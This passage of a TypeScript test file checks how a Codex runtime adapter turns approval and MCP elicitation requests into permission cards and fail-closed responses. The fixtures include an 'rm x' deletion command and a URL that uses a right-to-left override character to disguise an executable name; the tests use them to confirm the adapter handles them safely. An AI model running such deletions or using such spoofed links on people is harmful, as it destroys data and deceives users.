      await other.send('go')
      await new Promise((resolve) => setTimeout(resolve, 20))
      expect(quietReads).toBe(1)
      await other.close()
    })

    it('⚠️ a baseline that cannot be fetched says so, and the session is unharmed', async () => {
      const transport = new FakeTransport()
      transport.onRequest('thread/start', () => okThread('th_1'))
      transport.failRequest('account/rateLimits/read')
      const handle = await new CodexRuntime(adopt(transport)).start({
        cwd: '/tmp/x',
        providerHome: '/tmp/x/home',
      })
      const events: RuntimeEvent[] = []
      const consumer = collect(handle, events)

      await vi.waitFor(
        has(events, (e) => e.type === 'unknown' && e.label === 'account/rateLimits/read'),
      )
      const record = firstOfType(events, 'unknown')
      expect(record.raw).toMatchObject({ method: 'account/rateLimits/read' })
      expect(JSON.stringify(record.raw)).toContain('failed')
      expect(events.some((e) => e.type === 'session' && e.state === 'ended')).toBe(false)
      await handle.send('go')
      await vi.waitFor(has(events, (e) => e.type === 'status' && e.state === 'working'))

      await handle.close()
      await consumer
    })
  })
})

describe('CodexRuntime — approvals', () => {
  it('commandExecution requestApproval → permission_request; allow → accept', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(71, 'item/commandExecution/requestApproval', {
      command: 'rm x',
      cwd: '/tmp/x',
    })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    const perm = firstOfType(events, 'permission_request')
    expect(perm).toMatchObject({ id: 'number:71', kind: 'command' })
    expect(handle.status()).toBe('waiting_permission')

    await handle.respondPermission('number:71', { outcome: 'allow' })
    await vi.waitFor(() => expect(transport.responses.length).toBe(1))
    expect(transport.responses[0]).toEqual({ id: 71, result: { decision: 'accept' } })

    await handle.close()
    await consumer
  })

  it('fileChange deny → decline; cancel → cancel; allow_for_session → acceptForSession', async () => {
    const cases: [PermissionDecision, string][] = [
      [{ outcome: 'deny' }, 'decline'],
      [{ outcome: 'cancel' }, 'cancel'],
      [{ outcome: 'allow_for_session' }, 'acceptForSession'],
    ]
    for (const [decision, expected] of cases) {
      const { transport, handle, events, consumer } = await startCodexInTurn()
      transport.serverRequest(72, 'item/fileChange/requestApproval', { reason: 'write' })
      await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
      expect(firstOfType(events, 'permission_request').kind).toBe('file')
      await handle.respondPermission('number:72', decision)
      await vi.waitFor(() => expect(transport.responses.length).toBe(1))
      expect(transport.responses[0]).toEqual({ id: 72, result: { decision: expected } })
      await handle.close()
      await consumer
    }
  })

  it('⛔ 736 · R95 — `allow_always` on a card that carries no answer for it is refused `not-offered`, and nothing goes on the wire', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(73, 'item/fileChange/requestApproval', { reason: 'write' })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    await expect(
      handle.respondPermission('number:73', { outcome: 'allow_always' }),
    ).rejects.toMatchObject({ refusal: 'not-offered' })
    expect(transport.responses).toEqual([])
    await handle.respondPermission('number:73', { outcome: 'allow' })
    await vi.waitFor(() => expect(transport.responses.length).toBe(1))
    expect(transport.responses[0]).toEqual({ id: 73, result: { decision: 'accept' } })
    await handle.close()
    await consumer
  })

  it('a duplicate approval id (SAME kind) yields ONE card and exactly ONE safe response — never accept-after-decline (036 P1-B)', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(42, 'item/commandExecution/requestApproval', {
      command: 'echo FIRST',
      cwd: '/tmp/x',
    })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))

    transport.serverRequest(42, 'item/commandExecution/requestApproval', {
      command: 'echo SECOND',
      cwd: '/tmp/x',
    })
    await vi.waitFor(() => expect(transport.responses.some((r) => r.id === 42)).toBe(true))

    expect(events.filter((e) => e.type === 'permission_request').length).toBe(1)
    expect(firstOfType(events, 'permission_request').detail).toBe('echo FIRST')

    expect(transport.responses.filter((r) => r.id === 42)).toEqual([
      { id: 42, result: { decision: 'decline' } },
    ])

    await expect(handle.respondPermission('number:42', { outcome: 'allow' })).rejects.toThrow()
    await new Promise((r) => setTimeout(r, 10))
    expect(transport.responses.filter((r) => r.id === 42)).toHaveLength(1)
    expect(
      transport.responses.some(
        (r) => r.id === 42 && (r.result as { decision?: string }).decision === 'accept',
      ),
    ).toBe(false)

    await handle.close()
    await consumer
  })

  it('a duplicate provider id CROSS kind (permission then user-input) yields ONE card and one safe response — no second actionable card (036 P1-B)', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(90, 'item/commandExecution/requestApproval', {
      command: 'echo FIRST',
      cwd: '/tmp/x',
    })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))

    transport.serverRequest(90, 'item/tool/requestUserInput', {
      threadId: 'th_1',
      turnId: 'tn_1',
      itemId: 'it',
      questions: [{ id: 'q', question: 'pick', options: [] }],
    })
    await vi.waitFor(() =>
      expect(
        transport.responses.some((r) => r.id === 90) ||
          events.some((e) => e.type === 'user_input_request'),
      ).toBe(true),
    )

    expect(events.filter((e) => e.type === 'permission_request')).toHaveLength(1)
    expect(events.some((e) => e.type === 'user_input_request')).toBe(false)
    expect(transport.responses.filter((r) => r.id === 90)).toEqual([
      { id: 90, result: { decision: 'decline' } },
    ])
    await expect(handle.respondPermission('number:90', { outcome: 'allow' })).rejects.toThrow()

    await handle.close()
    await consumer
  })

  it('numeric 1 and string "1" are DISTINCT requests, SAME kind — two cards, two correctly-typed responses, neither hangs (044 P1-B)', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(1, 'item/commandExecution/requestApproval', {
      command: 'echo NUMERIC',
      cwd: '/tmp/x',
    })
    transport.serverRequest('1', 'item/commandExecution/requestApproval', {
      command: 'echo STRING',
      cwd: '/tmp/x',
    })
    await vi.waitFor(() =>
      expect(events.filter((e) => e.type === 'permission_request')).toHaveLength(2),
    )

    const cards = events.filter(
      (e): e is Extract<RuntimeEvent, { type: 'permission_request' }> =>
        e.type === 'permission_request',
    )
    expect(cards.map((c) => c.id)).toEqual(['number:1', 'string:1'])
    expect(cards.map((c) => c.detail)).toEqual(['echo NUMERIC', 'echo STRING'])

    await handle.respondPermission('number:1', { outcome: 'allow' })
    await handle.respondPermission('string:1', { outcome: 'deny' })
    await vi.waitFor(() => expect(transport.responses.length).toBe(2))
    expect(transport.responses).toContainEqual({ id: 1, result: { decision: 'accept' } })
    expect(transport.responses).toContainEqual({ id: '1', result: { decision: 'decline' } })
    expect(typeof transport.responses.find((r) => r.id === 1)?.id).toBe('number')
    expect(typeof transport.responses.find((r) => r.id === '1')?.id).toBe('string')

    await handle.close()
    await consumer
  })

  it('numeric 1 and string "1" are DISTINCT requests, CROSS kind — two cards, neither suppressed (044 P1-B)', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(2, 'item/commandExecution/requestApproval', {
      command: 'echo NUMERIC',
      cwd: '/tmp/x',
    })
    transport.serverRequest('2', 'item/tool/requestUserInput', {
      threadId: 'th_1',
      turnId: 'tn_1',
      itemId: 'it',
      questions: [{ id: 'q', question: 'pick', options: [] }],
    })
    await vi.waitFor(() => expect(events.some((e) => e.type === 'user_input_request')).toBe(true))

    expect(events.filter((e) => e.type === 'permission_request')).toHaveLength(1)
    expect(events.filter((e) => e.type === 'user_input_request')).toHaveLength(1)
    expect(firstOfType(events, 'permission_request').id).toBe('number:2')
    expect(firstOfType(events, 'user_input_request').id).toBe('string:2')

    await handle.respondPermission('number:2', { outcome: 'allow' })
    await handle.respondUserInput('string:2', { kind: 'answer', answers: { q: 'x' } })
    await vi.waitFor(() => expect(transport.responses.length).toBe(2))
    expect(transport.responses).toContainEqual({ id: 2, result: { decision: 'accept' } })
    expect(transport.responses).toContainEqual({
      id: '2',
      result: { answers: { q: { answers: ['x'] } } },
    })

    await handle.close()
    await consumer
  })

  it('provider follow-ups 1 · `isBlocking` rides the question card as data — and a non-blocking one still WAITS on the person, because Codex does', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(95, 'item/tool/requestUserInput', {
      threadId: 'th_1',
      turnId: 'tn_1',
      itemId: 'it',
      questions: [{ id: 'q', question: 'pick', options: [] }],
      isBlocking: false,
      autoResolutionMs: null,
    })
    await vi.waitFor(has(events, (e) => e.type === 'user_input_request'))
    const card = events.find((e) => e.type === 'user_input_request')
    expect(card?.type === 'user_input_request' ? card.isBlocking : undefined).toBe(false)
    expect(handle.status()).toBe('waiting_permission')
    await handle.close()
    await consumer
  })

  it('a duplicate provider id CROSS kind, REVERSE order (user-input then permission) settles the user-input request fail-closed — one card, one safe response (036 P1-B)', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(91, 'item/tool/requestUserInput', {
      threadId: 'th_1',
      turnId: 'tn_1',
      itemId: 'it',
      questions: [{ id: 'q', question: 'pick', options: [] }],
    })
    await vi.waitFor(has(events, (e) => e.type === 'user_input_request'))

    transport.serverRequest(91, 'item/commandExecution/requestApproval', {
      command: 'echo SECOND',
      cwd: '/tmp/x',
    })
    await vi.waitFor(() =>
      expect(
        transport.responses.some((r) => r.id === 91) ||
          events.some((e) => e.type === 'permission_request'),
      ).toBe(true),
    )

    expect(events.filter((e) => e.type === 'user_input_request')).toHaveLength(1)
    expect(events.some((e) => e.type === 'permission_request')).toBe(false)
    expect(transport.responses.filter((r) => r.id === 91)).toEqual([
      { id: 91, result: { answers: {} } },
    ])
    await expect(
      handle.respondUserInput('number:91', { kind: 'answer', answers: { q: 'x' } }),
    ).rejects.toThrow()

    await handle.close()
    await consumer
  })

  it('an unknown server request is safe-rejected (protocol-safe error, no hang)', async () => {
    const { transport, handle, consumer } = await startCodexInTurn()
    transport.serverRequest(99, 'brobot/notAMethodAnyProviderHas', {})
    await vi.waitFor(() => expect(transport.errors.length).toBe(1))
    expect(transport.errors[0]).toMatchObject({ id: 99 })
    await handle.close()
    await consumer
  })

  const KIBANA = {
    servers: [{ name: 'kibana', url: 'http://127.0.0.1:7001/mcp' }],
    reservedToolNames: ['spawn_agent'],
  }

  it('605 · a granted server is declared on thread/start as a config overlay', async () => {
    const transport = new FakeTransport()
    transport.onRequest('thread/start', () => okThread('th_1'))
    const runtime = new CodexRuntime(adopt(transport))
    const handle = await runtime.start({
      cwd: '/tmp/x',
      providerHome: '/tmp/x/home',
      externalMcp: KIBANA,
    })
    const started = transport.requests.find((one) => one.method === 'thread/start')
    expect((started?.params as { config?: unknown }).config).toEqual({
      ...EVERY_THREAD_OVERLAY,
      mcp_servers: { kibana: { url: 'http://127.0.0.1:7001/mcp' } },
    })
    await handle.close()
  })

  it('605 · a launch granted NOTHING declares no server — its overlay is the planning tool alone', async () => {
    const transport = new FakeTransport()
    transport.onRequest('thread/start', () => okThread('th_1'))
    const runtime = new CodexRuntime(adopt(transport))
    const handle = await runtime.start({ cwd: '/tmp/x', providerHome: '/tmp/x/home' })
    const started = transport.requests.find((one) => one.method === 'thread/start')
    expect((started?.params as { config?: unknown }).config).toEqual(EVERY_THREAD_OVERLAY)
    await handle.close()
    const second = new FakeTransport()
    second.onRequest('thread/start', () => okThread('th_2'))
    const other = await new CodexRuntime(adopt(second)).start({
      cwd: '/tmp/x',
      providerHome: '/tmp/x/home',
      externalMcp: { servers: [], reservedToolNames: ['spawn_agent'] },
    })
    expect(
      (second.requests.find((one) => one.method === 'thread/start')?.params as { config?: unknown })
        .config,
    ).toEqual(EVERY_THREAD_OVERLAY)
    await other.close()
  })

  it('605 · a RESUME re-declares them — the app-server remembers no config overlay', async () => {
    const transport = new FakeTransport()
    transport.onRequest('thread/resume', () => okThread('th_1'))
    const runtime = new CodexRuntime(adopt(transport))
    const handle = await runtime.resume(
      { provider: 'codex', sessionId: 'th_1', cwd: '/tmp/x', rotation: 1 },
      { providerHome: '/tmp/x/home', externalMcp: KIBANA },
    )
    const resumed = transport.requests.find((one) => one.method === 'thread/resume')
    expect((resumed?.params as { config?: unknown }).config).toEqual({
      ...EVERY_THREAD_OVERLAY,
      mcp_servers: { kibana: { url: 'http://127.0.0.1:7001/mcp' } },
    })
    await handle.close()
  })

  const ELICITATION = {
    turnId: null,
    serverName: 'kibana',
    mode: 'form',
    _meta: null,
    message: 'Which index should I search?',
    requestedSchema: {
      type: 'object',
      properties: {
        index: { type: 'string', enum: ['logs', 'metrics'], title: 'Index' },
        deep: { type: 'boolean', title: 'Search everything?' },
      },
      required: ['index'],
    },
  }

  it('605 · an elicitation with a NULL turnId still raises a card — and names the server', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(60, 'mcpServer/elicitation/request', ELICITATION)
    await vi.waitFor(has(events, (e) => e.type === 'user_input_request'))
    const card = firstOfType(events, 'user_input_request')
    expect(card.prompt).toContain('kibana is asking you something')
    expect(card.prompt).toContain('BroCrew cannot tell you which of this server’s tools')
    expect(card.prompt.indexOf('cannot tell you')).toBeLessThan(card.prompt.indexOf('kibana says:'))
    expect(card.prompt).toContain('kibana says: Which index should I search?')
    expect(card.mcpServerAsks).toEqual({ server: 'kibana' })
    expect(card.prompt).not.toContain('tool call')
    for (const claim of ['verified', 'checked', 'validated', 'confirmed', 'bounded']) {
      expect(card.prompt.toLowerCase()).not.toContain(claim)
    }
    await handle.close()
    await consumer
  })

  it('605 · the form becomes the questions, and the answers go back TYPED', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(61, 'mcpServer/elicitation/request', ELICITATION)
    await vi.waitFor(has(events, (e) => e.type === 'user_input_request'))
    const card = firstOfType(events, 'user_input_request')
    expect(card.questions.map((one) => one.id)).toEqual(['index', 'deep'])
    expect(card.questions[0]?.options.map((one) => one.label)).toEqual(['logs', 'metrics'])
    expect(card.questions[1]?.options.map((one) => one.label)).toEqual([
      'Leave this one out',
      'Yes',
      'No',
    ])
    expect(card.questions[0]?.options.map((one) => one.label)).toEqual(['logs', 'metrics'])

    await handle.respondUserInput('number:61', {
      kind: 'answer',
      answers: { index: 'metrics', deep: 'Yes' },
    })
    await vi.waitFor(() => expect(transport.responses.length).toBe(1))
    expect(transport.responses[0]).toEqual({
      id: 61,
      result: { action: 'accept', content: { index: 'metrics', deep: true }, _meta: null },
    })
    await handle.close()
    await consumer
  })

  it('605 · a TITLED choice is offered by its title and answered with its const', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(70, 'mcpServer/elicitation/request', {
      ...ELICITATION,
      requestedSchema: {
        type: 'object',
        properties: {
          env: {
            type: 'string',
            title: 'Environment',
            oneOf: [
              { const: 'prod-eu-1', title: 'Production (Europe)' },
              { const: 'stg-eu-1', title: 'Staging (Europe)' },
            ],
          },
        },
        required: ['env'],
      },
    })
    await vi.waitFor(has(events, (e) => e.type === 'user_input_request'))
    const card = firstOfType(events, 'user_input_request')
    expect(card.questions[0]?.options.map((one) => one.label)).toEqual([
      'Production (Europe)',
      'Staging (Europe)',
    ])
    await handle.respondUserInput('number:70', {
      kind: 'answer',
      answers: { env: 'Production (Europe)' },
    })
    await vi.waitFor(() => expect(transport.responses.length).toBe(1))
    expect(transport.responses[0]).toEqual({
      id: 70,
      result: { action: 'accept', content: { env: 'prod-eu-1' }, _meta: null },
    })
    await handle.close()
    await consumer
  })

  it('605 · an OPTIONAL field left alone is OMITTED, never sent as a value', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(72, 'mcpServer/elicitation/request', ELICITATION)
    await vi.waitFor(has(events, (e) => e.type === 'user_input_request'))
    await handle.respondUserInput('number:72', {
      kind: 'answer',
      answers: { index: 'logs', deep: 'Leave this one out' },
    })
    await vi.waitFor(() => expect(transport.responses.length).toBe(1))
    expect(transport.responses[0]).toEqual({
      id: 72,
      result: { action: 'accept', content: { index: 'logs' }, _meta: null },
    })
    await handle.close()
    await consumer
  })

  it('605 · a rejected card DECLINES, with no content — the documented negative', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(62, 'mcpServer/elicitation/request', ELICITATION)
    await vi.waitFor(has(events, (e) => e.type === 'user_input_request'))
    await handle.respondUserInput('number:62', { kind: 'reject' })
    await vi.waitFor(() => expect(transport.responses.length).toBe(1))
    expect(transport.responses[0]).toEqual({
      id: 62,
      result: { action: 'decline', content: null, _meta: null },
    })
    await handle.close()
    await consumer
  })

  it('605 · a number the person did not type as one is REFUSED, and the card stays open', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(63, 'mcpServer/elicitation/request', {
      ...ELICITATION,
      requestedSchema: {
        type: 'object',
        properties: { size: { type: 'integer', title: 'How many?' } },
        required: ['size'],
      },
    })
    await vi.waitFor(has(events, (e) => e.type === 'user_input_request'))
    await expect(
      handle.respondUserInput('number:63', { kind: 'answer', answers: { size: 'lots' } }),
    ).rejects.toThrow(/takes a number/)
    expect(transport.responses).toHaveLength(0)
    await expect(
      handle.respondUserInput('number:63', { kind: 'answer', answers: { size: '1.5' } }),
    ).rejects.toThrow(/takes a whole number/)
    expect(transport.responses).toHaveLength(0)
    await handle.respondUserInput('number:63', { kind: 'answer', answers: { size: '12' } })
    await vi.waitFor(() => expect(transport.responses.length).toBe(1))
    expect(transport.responses[0]).toEqual({
      id: 63,
      result: { action: 'accept', content: { size: 12 }, _meta: null },
    })
    await handle.close()
    await consumer
  })

  it('605 · W4.28 · a url request draws the server’s card with its link and *I opened it* — never silence', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(64, 'mcpServer/elicitation/request', {
      turnId: null,
      serverName: 'kibana',
      mode: 'url',
      _meta: null,
      message: 'Sign in here first.',
      url: 'https://example.invalid/auth',
      elicitationId: 'e1',
    })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    const card = firstOfType(events, 'permission_request')
    expect(card.scope.noPositiveBecause).toBeUndefined()
    expect(card.scope.availableDecisions).toEqual(['allow', 'deny', 'cancel'])
    expect(card.scope.underDisclosed).toBe(true)
    expect(card.action).toBe('kibana')
    expect(card.mcpServerAsks).toEqual({ server: 'kibana', url: 'https://example.invalid/auth' })
    expect(card.detail).toContain('kibana’s link: https://example.invalid/auth')
    await handle.respondPermission('number:64', { outcome: 'deny' })
    await vi.waitFor(() => expect(transport.responses.length).toBe(1))
    expect(transport.responses[0]).toEqual({
      id: 64,
      result: { action: 'decline', content: null, _meta: null },
    })
    transport.serverRequest(65, 'mcpServer/elicitation/request', {
      turnId: null,
      serverName: 'kibana',
      mode: 'url',
      _meta: null,
      message: 'Sign in here first.',
      url: 'https://example.invalid/auth',
      elicitationId: 'e2',
    })
    await vi.waitFor(() =>
      expect(events.filter((e) => e.type === 'permission_request')).toHaveLength(2),
    )
    await handle.respondPermission('number:65', { outcome: 'allow' })
    await vi.waitFor(() => expect(transport.responses.length).toBe(2))
    expect(transport.responses[1]).toEqual({
      id: 65,
      result: { action: 'accept', content: null, _meta: null },
    })
    transport.serverRequest(66, 'mcpServer/elicitation/request', {
      turnId: null,
      serverName: 'kibana',
      mode: 'url',
      _meta: null,
      message: 'Sign in here first.',
      url: 'https://example.invalid/\u202egnp.exe',
      elicitationId: 'e3',
    })
    await vi.waitFor(() =>
      expect(events.filter((e) => e.type === 'permission_request')).toHaveLength(3),
    )
    const withheld = events.filter((e) => e.type === 'permission_request').at(-1)
    if (withheld?.type !== 'permission_request') throw new Error('no card')
    expect(withheld.scope.availableDecisions).not.toContain('allow')
    expect(withheld.scope.noPositiveBecause).toBe('could-not-represent-the-answers')
    await handle.close()
    await consumer
  })

  it('605 · an ALLOW on the card that offers none is REFUSED, never recorded', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(73, 'mcpServer/elicitation/request', {
      turnId: null,
      serverName: 'kibana',
      mode: 'openai/form',
      _meta: null,
      message: 'Fill this in.',
      requestedSchema: { type: 'object' },
    })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    await expect(handle.respondPermission('number:73', { outcome: 'allow' })).rejects.toThrow(
      /not offered/,
    )
    expect(transport.responses).toHaveLength(0)
    await handle.respondPermission('number:73', { outcome: 'deny' })
    await vi.waitFor(() => expect(transport.responses.length).toBe(1))
    await handle.close()
    await consumer
  })

  it('605 · Cancel turn on that card sends `cancel`, which is its own action', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(71, 'mcpServer/elicitation/request', {
      turnId: null,
      serverName: 'kibana',
      mode: 'url',
      _meta: null,
      message: 'Sign in here first.',
      url: 'https://example.invalid/auth',
      elicitationId: 'e1',
    })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    await handle.respondPermission('number:71', { outcome: 'cancel' })
    await vi.waitFor(() => expect(transport.responses.length).toBe(1))
    expect(transport.responses[0]).toEqual({
      id: 71,
      result: { action: 'cancel', content: null, _meta: null },
    })
    await handle.close()
    await consumer
  })

  it('🔴 736 · R97 — Cancel on an IN-TURN elicitation sends the answer and nothing more — the turn runs on', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(75, 'mcpServer/elicitation/request', {
      serverName: 'kibana',
      mode: 'url',
      _meta: null,
      message: 'Sign in here first.',
      url: 'https://example.invalid/auth',
      elicitationId: 'e1',
    })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    expect(firstOfType(events, 'permission_request').cancelStopsNothing).toBe(true)
    await handle.respondPermission('number:75', { outcome: 'cancel' })
    await vi.waitFor(() => expect(transport.responses.length).toBe(1))
    expect(transport.responses[0]).toEqual({
      id: 75,
      result: { action: 'cancel', content: null, _meta: null },
    })
    await new Promise((resolve) => setTimeout(resolve, 20))
    expect(transport.requests.some((one) => one.method === 'turn/interrupt')).toBe(false)
    expect(transport.responses).toHaveLength(1)
    transport.notification(
      'turn/completed',
      turnCompletedNotification('th_1', completedTurn(transport.lastTurnId)),
    )
    await vi.waitFor(has(events, (e) => e.type === 'turn'))
    expect(events.filter((e) => e.type === 'turn')).toEqual([{ type: 'turn', state: 'completed' }])
    await handle.close()
    await consumer
  })

  it('⚑ 720 · R74 CONTROL — the same in-turn card DENIED asks nothing of the turn', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(76, 'mcpServer/elicitation/request', {
      serverName: 'kibana',
      mode: 'url',
      _meta: null,
      message: 'Sign in here first.',
      url: 'https://example.invalid/auth',
      elicitationId: 'e1',
    })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    await handle.respondPermission('number:76', { outcome: 'deny' })
    await vi.waitFor(() => expect(transport.responses.length).toBe(1))
    await new Promise((resolve) => setTimeout(resolve, 20))
    expect(transport.requests.some((one) => one.method === 'turn/interrupt')).toBe(false)
    await handle.close()
    await consumer
  })

  it('⚑ 720 · R74 CONTROL — a frame naming NO turn is never addressed to `currentTurn`, even with one bound', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(77, 'mcpServer/elicitation/request', {
      turnId: null,
      serverName: 'kibana',
      mode: 'url',
      _meta: null,
      message: 'Sign in here first.',
      url: 'https://example.invalid/auth',
      elicitationId: 'e1',
    })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    await handle.respondPermission('number:77', { outcome: 'cancel' })
    await vi.waitFor(() => expect(transport.responses.length).toBe(1))
    await new Promise((resolve) => setTimeout(resolve, 20))
    expect(transport.requests.some((one) => one.method === 'turn/interrupt')).toBe(false)
    await handle.close()
    await consumer
  })

  it('🔴 736 · R97 — an IN-TURN elicitation’s Cancel latches nothing, so a fault after it reads `failed`', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(78, 'mcpServer/elicitation/request', {
      serverName: 'kibana',
      mode: 'url',
      _meta: null,
      message: 'Sign in here first.',
      url: 'https://example.invalid/auth',
      elicitationId: 'e1',
    })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    await handle.respondPermission('number:78', { outcome: 'cancel' })
    await vi.waitFor(() => expect(transport.responses.length).toBe(1))
    await new Promise((resolve) => setTimeout(resolve, 20))
    expect(transport.requests.some((one) => one.method === 'turn/interrupt')).toBe(false)
    transport.endIncoming()
    await vi.waitFor(has(events, (e) => e.type === 'turn'))
    expect(events.filter((e) => e.type === 'turn')).toEqual([
      { type: 'turn', state: 'failed', wordOf: 'this-app' },
    ])
    await handle.close()
    await consumer
  })

  it('⚑ 720 · R71 CONTROL — a NO-TURN elicitation’s Cancel asks nothing, so a fault after it is the fault alone', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(79, 'mcpServer/elicitation/request', {
      turnId: null,
      serverName: 'kibana',
      mode: 'url',
      _meta: null,
      message: 'Sign in here first.',
      url: 'https://example.invalid/auth',
      elicitationId: 'e1',
    })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    await handle.respondPermission('number:79', { outcome: 'cancel' })
    await vi.waitFor(() => expect(transport.responses.length).toBe(1))
    await new Promise((resolve) => setTimeout(resolve, 20))
    transport.endIncoming()
    await vi.waitFor(has(events, (e) => e.type === 'turn'))
    expect(events.filter((e) => e.type === 'turn')).toEqual([
      { type: 'turn', state: 'failed', wordOf: 'this-app' },
    ])
    await handle.close()
    await consumer
  })

  it('🔴 720 · R71 — a FILE approval’s Cancel latches too; its Deny does not', async () => {
    for (const [outcome, word] of [
      ['cancel', 'interrupted'],
      ['deny', 'failed'],
    ] as const) {
      const { transport, handle, events, consumer } = await startCodexInTurn()
      transport.serverRequest(80, 'item/fileChange/requestApproval', {
        threadId: 'th_1',
        turnId: 'tn_1',
        itemId: 'it_3',
        startedAtMs: 0,
      })
      await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
      await handle.respondPermission('number:80', { outcome })
      await vi.waitFor(() => expect(transport.responses.length).toBe(1))
      transport.endIncoming()
      await vi.waitFor(has(events, (e) => e.type === 'turn'))
      expect(
        events.filter((e) => e.type === 'turn'),
        outcome,
      ).toEqual([{ type: 'turn', state: word, wordOf: 'this-app' }])
      await handle.close()
      await consumer
    }
  })

  it('605 · a FOREIGN thread is still refused, and a stale turn still is when one is named', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequestRaw(65, 'mcpServer/elicitation/request', {
      ...ELICITATION,
      threadId: 'th_somebody_else',
    })
    await vi.waitFor(() => expect(transport.responses.length).toBe(1))
    expect(transport.responses[0]).toEqual({
      id: 65,
      result: { action: 'decline', content: null, _meta: null },
    })
    expect(events.some((e) => e.type === 'user_input_request')).toBe(false)

    transport.serverRequestRaw(66, 'mcpServer/elicitation/request', {
      ...ELICITATION,
      threadId: 'th_1',
      turnId: 'turn_from_last_week',
    })
    await vi.waitFor(() => expect(transport.responses.length).toBe(2))
    expect(events.some((e) => e.type === 'user_input_request')).toBe(false)

    transport.serverRequest(67, 'mcpServer/elicitation/request', ELICITATION)
    await vi.waitFor(has(events, (e) => e.type === 'user_input_request'))
    await handle.close()
    await consumer
  })

  it('🔴 728 · R93 — a server’s own zero-field form is a CARD: its words, Allow, Deny and Cancel', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(68, 'mcpServer/elicitation/request', {
      ...ELICITATION,
      requestedSchema: { type: 'object', properties: {} },
    })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    const card = firstOfType(events, 'permission_request')
    expect(card.action).toBe('kibana')
    expect(card.mcpServerAsks).toEqual({ server: 'kibana' })
    expect(card.scope.availableDecisions).toEqual(['allow', 'deny', 'cancel'])
    expect(card.scope.noPositiveBecause).toBeUndefined()
    expect(card.mcpToolCall).toBeUndefined()
    expect(card.detail).toContain('kibana is asking you something')
    expect(card.detail).toContain('kibana says: Which index should I search?')
    expect(transport.responses).toHaveLength(0)
    await handle.close()
    await consumer
  })

  it('⚑ 728 · R93 — Allow on a server’s zero-field form sends `accept` with no content; Deny sends `decline`', async () => {
    for (const [pressed, sent] of [
      ['allow', { action: 'accept', content: {}, _meta: null }],
      ['deny', { action: 'decline', content: null, _meta: null }],
    ] as const) {
      const { transport, handle, events, consumer } = await startCodexInTurn()
      transport.serverRequest(68, 'mcpServer/elicitation/request', {
        ...ELICITATION,
        turnId: transport.lastTurnId,
        requestedSchema: { type: 'object', properties: {} },
      })
      await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
      await handle.respondPermission(firstOfType(events, 'permission_request').id, {
        outcome: pressed,
      })
      await vi.waitFor(() => expect(transport.responses).toHaveLength(1))
      expect(transport.responses[0], pressed).toEqual({ id: 68, result: sent })
      await handle.close()
      await consumer
    }
  })

  it('605 · a frame that names NO server raises nothing — the card has one claim and it needs it', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(69, 'mcpServer/elicitation/request', {
      ...ELICITATION,
      serverName: '',
    })
    await vi.waitFor(() => expect(transport.responses.length).toBe(1))
    expect(events.some((e) => e.type === 'user_input_request')).toBe(false)
    expect(events.some((e) => e.type === 'permission_request')).toBe(false)
    await handle.close()
    await consumer
  })

  const CODEX_ASKS = {
    serverName: 'brobot723',
    mode: 'form',
    _meta: {
      codex_approval_kind: 'mcp_tool_call',
      persist: ['session', 'always'],
      tool_description: '723 probe · records that it ran, with what',
      tool_params: { note: 'one' },
      tool_params_display: [{ name: 'note', value: 'one', display_name: 'note' }],
    },
    message: 'Allow the brobot723 MCP server to run tool "note_it"?',
    requestedSchema: { type: 'object', properties: {} },
  }

  const aCallStarts = (
    transport: FakeTransport,
    id: string,
    tool = 'note_it',
    server = 'brobot723',
  ): void =>
    transport.notification('item/started', {
      threadId: 'th_1',
      turnId: transport.lastTurnId,
      item: {
        type: 'mcpToolCall',
        id,
        server,
        tool,
        status: 'inProgress',
        arguments: { note: 'one' },
        appContext: null,
        result: null,
        error: null,
        durationMs: null,
      },
    })
